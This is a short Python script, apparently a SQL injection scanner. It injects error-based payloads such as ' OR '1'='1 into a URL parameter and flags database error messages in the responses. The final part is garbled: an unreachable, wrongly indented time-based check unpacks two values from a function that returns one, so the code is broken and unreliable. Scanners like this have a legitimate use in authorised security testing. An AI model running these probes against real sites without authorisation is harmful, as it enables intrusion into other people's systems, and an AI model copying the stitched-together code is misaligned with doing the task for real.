import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ERROR_PAYLOADS = ["'\"", "' OR '1'='1", "';", '" OR "1"="1']
SQL_ERRORS = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "unterminated", 
    "unexpected end", "pg_query", "You have an error", "ODBC"
]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    try:
        response = requests.get(new_url)
        return response
    except requests.exceptions.RequestException as e:
        print(f"❌ Error with {new_url}: {e}")
        return None

def detect_sqli(url, param):
    findings = []
    for payload in ERROR_PAYLOADS:
        resp = inject_payload(url, param, payload)
        if resp is not None:
            for err in SQL_ERRORS:
                if err in resp.text:
                    findings.append((payload, f"⚠️ SQL Error: {err}"))
    return findings
        _, duration = inject_payload(url, param, payload)
        if isinstance(duration, float) and duration > 4.5:
            findings.append((payload, f"⏱️ Time-Based SQLi ({duration:.2f}s)"))

    return findings
